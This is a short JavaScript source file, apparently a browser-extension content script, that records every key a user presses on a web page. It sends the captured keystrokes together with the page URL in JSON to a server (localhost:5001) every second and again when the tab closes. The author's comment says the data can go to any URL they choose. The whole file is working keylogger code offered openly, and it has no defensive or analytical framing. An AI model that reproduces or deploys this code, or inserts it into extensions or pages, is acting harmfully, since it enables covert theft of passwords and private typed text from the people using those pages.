// Logs key presses in the data dictionary
// key presses are then sent to localhost or any url that I want


// data used to hold key presses
var data = {};
var time = new Date().getTime();
data[time] = ''
// makes sure we only send when there's something to send
var shouldSend = false;
// used for issues with allframes injection
var lastLog = time;

// Makes a post request to send json to the designated server
function sendingToServer(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:5001/", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        url: document.URL,
        logs: data
    }));
}

// Listens for keypress and logs it
document.addEventListener('keydown', (e) => {
    // console.log(e.key, e.code);
    // console.log(typeof(e.key));
    log(e.key);
});

// Logs the input so that it can be sent
function log(input) {
    var now = new Date().getTime();
    if (now - lastLog < 10) {
        return; 
    };
    data[time] += input;
    console.log(data);
    shouldSend = true;
    lastLog = now;
    // console.log(now);
    // console.log("Logged", input);
}


// Logs that the tab has been closed and sends the data
window.onbeforeunload = function() {
    data[time] += '[closed]'
    sendingToServer(data)
} 

// Sends the data every second 
setInterval(function(){
    if (shouldSend) {
        sendingToServer(data);
        shouldSend = false;
    }
    delete data[time];
    time = new Date().getTime();
    data[time] = ''

}, 1000); 
